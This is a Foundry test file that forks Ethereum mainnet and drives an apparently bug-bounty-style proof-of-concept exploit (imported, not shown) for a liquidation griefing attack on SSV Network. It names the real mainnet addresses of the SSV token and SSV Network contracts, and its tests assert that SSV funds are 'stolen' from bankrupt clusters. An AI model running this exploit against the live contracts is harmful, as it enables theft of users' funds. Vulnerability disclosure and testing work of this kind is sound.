// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/SSVLiquidationGriefingPoC.sol";

/**
 * @title SSV Liquidation Griefing PoC Test
 * @notice Foundry test demonstrating time-delayed liquidation griefing attack
 * @dev Run with: forge test -vv --match-path test/SSVLiquidationGriefing.t.sol
 * 
 * SAFETY: This test runs on a LOCAL FORK of mainnet using vm.createSelectFork().
 * No transactions are sent to actual mainnet.
 */
contract SSVLiquidationGriefingTest is Test {
    SSVLiquidationGriefingPoC exploit;
    IERC20[] tokens;
    
    // SSV Token address
    address constant SSV_TOKEN = 0x9D65fF81a3c488d585bBfb0Bfe3c7707c7917f54;
    address constant SSV_NETWORK = 0xDD9BC35aE942eF0cFa76930954a156B3fF30a4E1;
    
    function setUp() public {
        // Fork mainnet at a recent block
        vm.createSelectFork("mainnet", 19200000);
        
        // Deploy the exploit contract
        exploit = new SSVLiquidationGriefingPoC();
        
        // Setup tokens to track
        tokens.push(IERC20(SSV_TOKEN));
        
        // Give exploit contract some SSV tokens
        deal(SSV_TOKEN, address(exploit), 10175e18);
        
        // Set aliases for better logging
        exploit.setAlias(address(exploit), "Attacker");
        
        console.log(">>> Liquidation Griefing Attack Setup Complete");
        console.log(">>> Testing against actual SSV Network contracts");
    }
    
    /**
     * @notice Main test demonstrating liquidation griefing attack
     */
    function testLiquidationGriefingAttack() public {
        exploit.initiateAttack();
        
        // Verify the attack succeeded
        uint256 stolen = exploit.getTotalStolen();
        uint256 victimLoss = exploit.getVictimLoss();
        
        require(stolen > 0, "Attack failed - no funds stolen");
        require(victimLoss > 0, "Vulnerability not demonstrated");
        
        console.log("\n>>> VULNERABILITY CONFIRMED");
        console.log("Total stolen:   ", stolen / 1e18, "SSV");
        console.log("Victim loss:    ", victimLoss / 1e18, "SSV");
    }
    
    /**
     * @notice Test the multi-cluster cascading effect
     */
    function testMultiClusterCascadingEffect() public {
        exploit.initiateAttack();
        
        uint256 stolen = exploit.getTotalStolen();
        
        // With 3 bankrupt clusters, virtual debt should be significant
        assertGt(stolen, 400e18, "Multi-cluster effect not demonstrated");
        
        console.log("Multi-cluster cascading effect confirmed!");
        console.log("Total stolen from multiple bankrupt clusters:", stolen / 1e18, "SSV");
    }
    
    /**
     * @notice Test that demonstrates the griefing maximizes theft
     */
    function testGriefingMaximizesTheft() public {
        exploit.initiateAttack();
        
        uint256 stolen = exploit.getTotalStolen();
        
        // The griefing period of 200 blocks should create substantial virtual debt
        console.log("Griefing period virtual debt:", stolen / 1e18, "SSV");
        console.log("This demonstrates how delaying liquidation maximizes theft!");
        
        assertGt(stolen, 0, "Griefing did not result in theft");
    }
    
    /**
     * @notice Test against real mainnet bytecode
     */
    function testMainnetBytecodeVulnerability() public {
        // Verify the contract exists on mainnet
        address ssvNetwork = SSV_NETWORK;
        
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(ssvNetwork)
        }
        require(codeSize > 0, "SSV Network not found on fork");
        
        // Run the exploit
        exploit.initiateAttack();
        
        uint256 stolen = exploit.getTotalStolen();
        require(stolen > 0, "Vulnerability not present in production");
        
        console.log("Production vulnerability confirmed!");
        console.log("SSV Network at", ssvNetwork);
        console.log("Liquidation griefing can steal:", stolen / 1e18, "SSV");
    }
}
